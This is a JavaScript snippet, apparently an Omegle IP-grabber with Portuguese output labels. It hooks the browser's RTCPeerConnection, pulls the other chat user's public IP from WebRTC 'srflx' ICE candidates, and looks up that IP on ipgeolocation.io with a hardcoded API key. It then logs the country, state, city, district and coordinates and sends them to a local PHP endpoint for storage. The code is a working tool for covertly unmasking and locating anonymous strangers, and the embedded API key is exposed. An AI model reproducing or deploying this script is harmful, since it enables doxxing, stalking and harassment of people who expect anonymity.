let apiKey = "aae79366964542e8a4dfa85d802d576a";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          IP: ${ip}
          Pais: ${json.country_name}
          Estado: ${json.state_prov}
          Cidade: ${json.city}
          Distrito: ${json.district}
          Latitude / Longitude: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      	console.log(output);
	
	fetch('http://localhost/omegle/insere.php?ip='+ip+'&pais='+json.country_name+'&estado='+json.state_prov+'&cidade='+json.city+'&distrito='+json.district+'&lat='+json.latitude+'&lon='+json.longitude, {
	  "headers": {
	    "accept": "*/*",
	    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
	    "sec-fetch-mode": "no-cors",
	    "sec-fetch-site": "cross-site"
	  },
	  "referrerPolicy": "strict-origin-when-cross-origin",
	  "body": null,
	  "method": "GET",
	  "mode": "cors",
	  "credentials": "omit"
	});
    })
  );
};
